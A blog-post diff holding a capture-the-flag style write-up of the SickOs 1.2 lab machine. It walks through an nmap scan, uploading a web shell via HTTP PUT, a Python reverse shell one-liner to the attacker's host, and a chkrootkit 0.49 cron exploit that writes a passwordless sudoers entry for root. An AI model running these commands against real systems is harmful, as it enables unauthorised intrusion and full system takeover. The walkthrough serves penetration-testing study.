@@ -1,0 +1,118 @@
+---
+title: "SickOs 1.2"
+layout: post
+date: 2017-11-21
+image: /assets/images/markdown.jpg
+headerImage: false
+tag:
+- Writeup
+- Pentest
+category: blog
+author: marioibarra
+description:  SickOs 1.2 Writeup
+---
+
+# SickOs 1.2 Writeup
+
+
+
+## Recon & Enumeration
+
+An NMAP scan revealed 2 ports open on the target.
+
+<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:red">mario@kali</span>:~/oscp/exam/10.10.10.12$ cat 10.10.10.12.nmap 
+# Nmap 7.60 scan initiated Mon Nov  6 01:57:20 2017 as: nmap -sV -O -oN /home/mario/oscp/exam/10.10.10.12/10.10.10.12.nmap 10.10.10.12
+Nmap scan report for 10.10.10.12
+Host is up (0.00042s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    lighttpd 1.4.28
+MAC Address: 00:0C:29:8A:41:77 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.8, Linux 3.16 - 4.6, Linux 3.2 - 4.8, Linux 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Nov  6 01:57:47 2017 -- 1 IP address (1 host up) scanned in 28.00 seconds
+</code></pre></figure>
+
+After enumerating the http service <b>lighttpd</b>, a <b>/test/</b> directory was found.
+
+![image](/assets/images/sickos1.2/test.png)
+
+I checked for the PUT option was enabled on the directory with curl.
+
+![image](/assets/images/sickos1.2/curl.png)
+
+
+
+
+## Exploitation
+
+PUT was in fact enabled, so I put a web shell on the directory that can execute linux commands.
+
+![image](/assets/images/sickos1.2/put-test.png)
+
+![image](/assets/images/sickos1.2/put-test2.png)
+
+
+By accessing the web shell, I could execute commands directly on the target.
+
+![image](/assets/images/sickos1.2/cmd.png)
+
+
+Using the same web shell, I sent this python reverse shell to my machine:
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+I received the reverse shell with netcat.
+
+![image](/assets/images/sickos1.2/www-shell.png)
+
+
+
+
+## Post-Exploitation
+
+I escaped the restricted shell by spawning a tty shell using python:
+
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After running my enumeration scripts and searching for possible privilege escalation vectors, I couldn't find any that stood out.  
+
+I then checked the crontab for any applications that I could search on searchsploit.  Under /etc/cron.daily, chkrootkit was listed.
+
+I checked the version of chkrootkit, 0.49, and found an exploit on searchsploit:
+
+```bash
+dpkg -l | grep chkrootkit
+```
+
+Under the <b>/tmp</b> directory, I created a file called <b>update</b> with commands to add the user <b>www-data</b>, and I made it an executable file:
+```bash
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+
+chmod +x update
+```
+
+The exploit would run the command in the /tmp/update file whenever the cronjob occurred.
+
+Since the cronjob for chkrootkit was run daily, I forced it to run instead of waiting:
+```bash
+run-parts --report /etc/cron.daily
+```
+
+After the cronjob ran, I had root access by running "<b>sudo su</b>" without a password needed.
+
+![image](/assets/images/sickos1.2/root.png)
+
+![image](/assets/images/sickos1.2/flag.png)
